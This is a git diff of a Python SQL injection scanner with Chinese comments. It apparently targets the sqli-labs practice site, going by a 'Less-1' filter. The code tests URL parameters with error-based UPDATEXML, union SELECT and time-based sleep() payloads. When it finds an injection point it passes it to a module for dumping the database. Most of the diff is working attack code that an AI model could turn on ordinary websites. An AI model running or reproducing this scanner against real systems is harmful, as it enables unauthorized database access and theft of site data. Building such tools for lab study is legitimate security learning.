@@ -3,12 +3,10 @@
 # -*- coder : CO0kie丶 -*-
 # -*- time  : 20201118 -*-
 
-
-import requests
 import sys
 from time import sleep
-from time import perf_counter
 from userdata import Global_UserData
+from myhttp import HTTP
 from inj_union import InjUnion
 
 print('我被打印了_Scanner.py')
@@ -16,33 +14,6 @@ print('我被打印了_Scanner.py')
 # 初始化全局参数
 Global_XlsSavePath = Global_UserData['XlsSavePath']
 Global_Headers = {'User-Agent': Global_UserData['User-Agent']}
-
-
-class HTTP(object):
-    content = None
-    con_len = 0
-    old_time = 0.0
-    new_time = 0.0
-
-    def GetSelf(self):
-        return self
-
-    def GET(self, Url: str):
-        """
-        函数：GET请求
-
-        :param Url: URL统一资源定位器
-        :return: 响应体长度
-        """
-        self.content = requests.get(Url)
-        self.old_time = self.new_time
-        self.new_time = perf_counter()
-        self.con_len = int(self.content.headers['Content-Length']) \
-            if 'Content-Length' in self.content.headers \
-            else int(len(self.content.content))
-        return self.con_len, self.content.status_code,
-
-    pass
 
 
 class UrlInjector(HTTP):
@@ -54,7 +25,7 @@ class UrlInjector(HTTP):
         self._lock.release()
         pass
 
-    def CheckInj(self):
+    def CheckInj(self) -> bool:
         """
         函数：检查该站点是否存在注入
 
@@ -72,9 +43,9 @@ class UrlInjector(HTTP):
                     self._inj_info['注入方式'] = {}
 
                 # 判断类型注入
-                if '基于类型注入' not in self._inj_info['注入方式']:
-                    self._url_end = url_end
-                    self._inj_info['注入方式']['基于类型注入'] = self._url % url_end
+                # if '基于类型注入' not in self._inj_info['注入方式']:
+                #     self._url_end = url_end
+                #     self._inj_info['注入方式']['基于类型注入'] = self._url % url_end
 
                 # 判断报错注入
                 url = self.url % url_end + ' and UPDATEXML(0,concat(char(126)),0)--+'
@@ -85,17 +56,26 @@ class UrlInjector(HTTP):
             pass
 
         # 闭合循环完毕，判断联合注入
-        if self._url_end is not None:
-            url0 = self._url % self._url_end + ' union SELECT %s --+'
+        for url_end in Global_UserData['inj_type']:
+            url0 = self._url % f"0{url_end[1:]} union SELECT %s --+"
             sql_code = ''
             for i in range(1, 10):
-                sql_code += f'{i},'
+                sql_code += "'vErSiOn1',"
                 url = url0 % sql_code[:-1]
                 newlen, code = self.GET(url)
-                self.Print(f'{code=},{newlen=},{i}【{url}】')
-                if newlen == self.body_len:
-                    self._inj_info['注入方式']['基于联合注入'] = i
+                self.Print(f'{code=},{newlen=},{url_end=},{i=}【{url}】')
+                if "vErSiOn1" in self.content.text:
+                    if 'right syntax' in self.content.text:
+                        continue
+                    sql_code = ('1,' * (i - 1))[:-1]
+                    sql_code += ',(%s)'
+                    self._inj_info['注入方式']['基于联合注入'] = url0 % sql_code
+                    self.Print(f'联合注入点【{url0 % sql_code}】')
+                    # sys.exit()
+                    url0 = None
                     break
+            if url0 is None:
+                break
             pass
 
         # 判断时间盲注
@@ -103,22 +83,18 @@ class UrlInjector(HTTP):
         self.Print(f"{code=},{newlen=},{self.new_time}【{self._url % '1'}】")
         for url_end in Global_UserData['inj_type']:
             # 循环构造 注入点
-            url = self._url % url_end + ' and if(1,sleep(1),0)--+'
+            url = self._url % url_end + ' and if(1,sleep(0.4),0)--+'
 
             # 查询新时间
             newlen, code = self.GET(url)
-            print(f'{code=},{newlen=},{self.new_time}【{url}】')
+            print(f'>>>{self._threadname}：{code=},{newlen=},{self.new_time}【{url}】')
 
             # 如果时间相减毫秒数＞900
-            if (self.new_time - self.old_time) * 1000 > 900:
+            if (self.new_time - self.old_time) * 1000 > 300:
                 self._inj_info['注入方式']['基于时间盲注'] = self._url % url_end
                 break
-
-        # 保存结果
-        self._lock.acquire()
-        print(self._url, self._inj_info)
-        Global_UserData['result'][self._url] = self._inj_info.copy()
-        self._lock.release()
+            pass
+        return "注入方式" in self._inj_info
         pass
 
     def __init__(self, Lock, ThreadName, Url):
@@ -126,21 +102,37 @@ class UrlInjector(HTTP):
         self._lock = Lock
         self._threadname = ThreadName
         self._url = Url
-        # if 'Less-1' not in Url:
-        #     return
+        if 'Less-1' not in Url:
+            return
 
         self.Print(f'扫描器传入 {Url=}')
-
         self.url = Url
+
         self.body_len, code = self.GET(Url % '1')
         self.Print(f'初始化Len {self.body_len}')
         if not self.body_len > 0:
             self.Print(f'无法注入，请检查该网页是否正常【{Url % "1"}】')
             return
-        # self._InjUnion = InjUnion
         self._inj_info = {}
-        self._url_end = None
-        self.CheckInj()
+
+        # 初始化参数完毕，开始检测注入点
+        if self.CheckInj():
+            # 如果有注入点，则通过注入点权重脱裤
+            inj_urls: dict = self._inj_info['注入方式']
+            if "基于联合注入" in inj_urls:
+                self._InjUnion = InjUnion(
+                    self._lock, self._threadname, self._inj_info)
+            elif "基于报错注入" in inj_urls:
+                pass
+            elif "基于时间盲注" in inj_urls:
+                pass
+            pass
+
+        # 保存结果
+        self._lock.acquire()
+        # print(f">>>>{self._threadname}：", self._url, self._inj_info)
+        Global_UserData['result'][self._url] = self._inj_info.copy()
+        self._lock.release()
         pass
 
     pass
